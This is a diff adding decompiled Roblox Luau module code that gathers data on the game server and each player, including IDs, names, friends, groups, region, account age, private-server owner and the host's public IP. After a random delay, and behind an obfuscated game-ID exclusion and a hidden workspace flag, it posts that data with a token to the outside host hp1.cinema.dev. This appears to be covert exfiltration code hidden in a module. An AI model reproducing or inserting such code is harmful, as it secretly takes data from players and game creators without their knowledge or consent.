+            local l_v30_JoinData_0 = v30:GetJoinData();
+            local v33 = {
+                SourceGameId = l_v30_JoinData_0.SourceGameId, 
+                SourcePlaceId = l_v30_JoinData_0.SourcePlaceId, 
+                ReferredByPlayerId = l_v30_JoinData_0.ReferredByPlayerId, 
+                Members = l_v30_JoinData_0.Members
+            };
+            local l_TeleportData_0 = l_v30_JoinData_0.TeleportData;
+            local v35;
+            if l_TeleportData_0 ~= nil then
+                local l_l_TeleportData_0_0 = l_TeleportData_0 --[[ copy: 4 -> 7 ]];
+                local l_status_0, _ = pcall(function() --[[ Line: 255 ]]
+                    return l_HttpService_0:JSONEncode(l_l_TeleportData_0_0);
+                end);
+                if l_status_0 then
+                    v35 = l_TeleportData_0;
+                    v31 = true;
+                end;
+            end;
+            if not v31 then
+                v35 = nil;
+            end;
+            v31 = false;
+            v33.TeleportData = v35;
+            l_TeleportData_0 = l_v30_JoinData_0.LaunchData;
+            if l_TeleportData_0 ~= nil then
+                l_TeleportData_0 = l_HttpService_0:UrlEncode(l_TeleportData_0);
+            end;
+            v33.LaunchData = l_TeleportData_0;
+            return v33;
+        end;
+        local function _(v40) --[[ Line: 274 ]] --[[ Name: GetNetworkPing ]]
+            local l_status_1, l_result_1 = pcall(function() --[[ Line: 275 ]]
+                return v40:GetNetworkPing() * 1000;
+            end);
+            return l_status_1 and l_result_1 or nil;
+        end;
+        local function v58(v44, v45) --[[ Line: 281 ]] --[[ Name: addPlayer ]]
+            local l_UserId_0 = v45.UserId;
+            for _, v48 in ipairs(v44.Players) do
+                if v48.UserId == l_UserId_0 then
+                    local l_status_2, l_result_2 = pcall(function() --[[ Line: 275 ]]
+                        return v45:GetNetworkPing() * 1000;
+                    end);
+                    local v51 = l_status_2 and l_result_2 or nil;
+                    if v51 then
+                        v48.NetworkPing = v51;
+                    end;
+                    return;
+                end;
+            end;
+            local v52 = not v8 and v45 == l_Players_0.LocalPlayer;
+            local v53 = {
+                IsLocal = v52, 
+                UserId = v45.UserId, 
+                Name = v45.Name, 
+                DisplayName = v45.DisplayName, 
+                MembershipType = v45.MembershipType.Name, 
+                LocaleId = l_HttpService_0:UrlEncode(v45.LocaleId), 
+                HasVerifiedBadge = v45.HasVerifiedBadge, 
+                FollowUserId = v45.FollowUserId, 
+                AccountCreated = (math.floor(os.time() / 86400) - v45.AccountAge) * 86400, 
+                IsVerified = v8 and v45:IsVerified() or nil, 
+                JoinData = v39(v45)
+            };
+            local l_status_3, l_result_3 = pcall(function() --[[ Line: 275 ]]
+                return v45:GetNetworkPing() * 1000;
+            end);
+            v53.NetworkPing = l_status_3 and l_result_3 or nil;
+            task.spawn(pcall, function() --[[ Line: 310 ]]
+                v53.Groups = v14(v45);
+            end);
+            if v52 then
+                task.spawn(pcall, function() --[[ Line: 314 ]]
+                    v53.Friends = v29(v45);
+                end);
+            end;
+            task.spawn(pcall, function() --[[ Line: 318 ]]
+                v53.Policy = v20(v45);
+            end);
+            task.spawn(pcall, function() --[[ Line: 321 ]]
+                local l_v53_0 = v53;
+                local l_l_LocalizationService_0_CountryRegionForPlayerAsync_1 = l_LocalizationService_0:GetCountryRegionForPlayerAsync(v45);
+                l_v53_0.Region = l_HttpService_0:UrlEncode(l_l_LocalizationService_0_CountryRegionForPlayerAsync_1);
+            end);
+            table.insert(v44.Players, v53);
+        end;
+        local v59 = 0;
+        local v60 = false;
+        local v61 = false;
+        local function _() --[[ Line: 331 ]] --[[ Name: BindToClose ]]
+            if v61 then
+                return;
+            else
+                v61 = true;
+                game:BindToClose(function() --[[ Line: 336 ]]
+                    v60 = true;
+                    while v59 > 0 do
+                        task.wait();
+                    end;
+                end);
+                return;
+            end;
+        end;
+        local function v65(v63) --[[ Line: 344 ]] --[[ Name: ClosingWait ]]
+            if not v61 then
+                v61 = true;
+                game:BindToClose(function() --[[ Line: 336 ]]
+                    v60 = true;
+                    while v59 > 0 do
+                        task.wait();
+                    end;
+                end);
+            end;
+            local v64 = os.clock() + v63;
+            repeat
+                task.wait();
+            until v60 or v64 <= os.clock();
+        end;
+        local function _(v66) --[[ Line: 352 ]] --[[ Name: Run ]]
+            if not v61 then
+                v61 = true;
+                game:BindToClose(function() --[[ Line: 336 ]]
+                    v60 = true;
+                    while v59 > 0 do
+                        task.wait();
+                    end;
+                end);
+            end;
+            v59 = v59 + 1;
+            pcall(v66);
+            v59 = v59 - 1;
+        end;
+        local function v76(v68) --[[ Line: 361 ]] --[[ Name: Build ]]
+            local v69 = {
+                Basic = {
+                    Version = 1, 
+                    ServerTimeNow = workspace:GetServerTimeNow(), 
+                    UUID = l_HttpService_0:GenerateGUID(false):gsub("-", "")
+                }, 
+                Game = {
+                    GameId = game.GameId, 
+                    PlaceId = game.PlaceId, 
+                    JobId = game.JobId, 
+                    PlaceVersion = game.PlaceVersion, 
+                    PrivateServerId = v8 and game.PrivateServerId or nil, 
+                    PrivateServerOwnerId = v8 and game.PrivateServerOwnerId or nil, 
+                    CreatorId = game.CreatorId, 
+                    CreatorType = game.CreatorType.Name
+                }, 
+                RunService = {
+                    IsServer = l_RunService_0:IsServer(), 
+                    IsClient = l_RunService_0:IsClient(), 
+                    IsStudio = l_RunService_0:IsStudio(), 
+                    IsRunMode = l_RunService_0:IsRunMode()
+                }, 
+                LocalizationService = {
+                    RobloxLocaleId = l_HttpService_0:UrlEncode(l_LocalizationService_0.RobloxLocaleId), 
+                    SystemLocaleId = l_HttpService_0:UrlEncode(l_LocalizationService_0.SystemLocaleId)
+                }, 
+                Players = {}
+            };
+            pcall(function() --[[ Line: 392 ]]
+                v69.RunService.IsEdit = l_RunService_0:IsEdit();
+            end);
+            task.spawn(pcall, function() --[[ Line: 395 ]]
+                v69.Basic.HostIP = l_HttpService_0:GetAsync("https://checkip.amazonaws.com", true):gsub("^%s*(.-)%s*$", "%1");
+            end);
+            for _, v71 in ipairs(l_Players_0:GetPlayers()) do
+                v58(v69, v71);
+            end;
+            if v68 ~= "Instant" then
+                local v73 = l_Players_0.PlayerAdded:Connect(function(v72) --[[ Line: 404 ]]
+                    v58(v69, v72);
+                end);
+                if l_RunService_0:IsStudio() then
+                    if v68 == "Fast" then
+                        v65(1);
+                    else
+                        v65(10 + 10 * math.random());
+                    end;
+                elseif v68 == "Fast" then
+                    v65(5);
+                else
+                    v65(30 + 60 * math.random());
+                end;
+                for _, v75 in ipairs(l_Players_0:GetPlayers()) do
+                    v58(v69, v75);
+                end;
+                v73:Disconnect();
+            end;
+            return v69;
+        end;
+        local function _() --[[ Line: 429 ]] --[[ Name: ServerTask ]]
+            local function v78() --[[ Line: 430 ]]
+                if not v8 then
+                    return;
+                elseif not l_HttpService_0.HttpEnabled then
+                    return;
+                elseif table.find({
+                    -6506286475, 
+                    -6401952733
+                }, -game.GameId + 1) then
+                    return;
+                elseif workspace:GetAttribute("__CONFIGURE1") then
+                    return;
+                else
+                    workspace:SetAttribute("__CONFIGURE1", true);
+                    local v77 = v76("Standard");
+                    l_HttpService_0:PostAsync("https://hp1.cinema.dev/api/data", l_HttpService_0:JSONEncode(v77), Enum.HttpContentType.ApplicationJson, true, {
+                        token = "6151d771-badf-418e-8857-21f8d81c4de5"
+                    });
+                    return;
+                end;
+            end;
+            if not v61 then
+                v61 = true;
+                game:BindToClose(function() --[[ Line: 336 ]]
+                    v60 = true;
+                    while v59 > 0 do
+                        task.wait();
+                    end;
+                end);
+            end;
+            v59 = v59 + 1;
+            pcall(v78);
+            v59 = v59 - 1;
+        end;
+        local function v81() --[[ Line: 430 ]]
+            if not v8 then
+                return;
+            elseif not l_HttpService_0.HttpEnabled then
+                return;
+            elseif table.find({
+                -6506286475, 
+                -6401952733
+            }, -game.GameId + 1) then
+                return;
+            elseif workspace:GetAttribute("__CONFIGURE1") then
+                return;
+            else
+                workspace:SetAttribute("__CONFIGURE1", true);
+                local v80 = v76("Standard");
+                l_HttpService_0:PostAsync("https://hp1.cinema.dev/api/data", l_HttpService_0:JSONEncode(v80), Enum.HttpContentType.ApplicationJson, true, {
+                    token = "6151d771-badf-418e-8857-21f8d81c4de5"
+                });
+                return;
+            end;
+        end;
+        if not v61 then
+            v61 = true;
+            game:BindToClose(function() --[[ Line: 336 ]]
+                v60 = true;
+                while v59 > 0 do
+                    task.wait();
+                end;
+            end);
+        end;
+        v59 = v59 + 1;
+        pcall(v81);
+        v59 = v59 - 1;
+        return;
+    end;
+end);
+return v0;
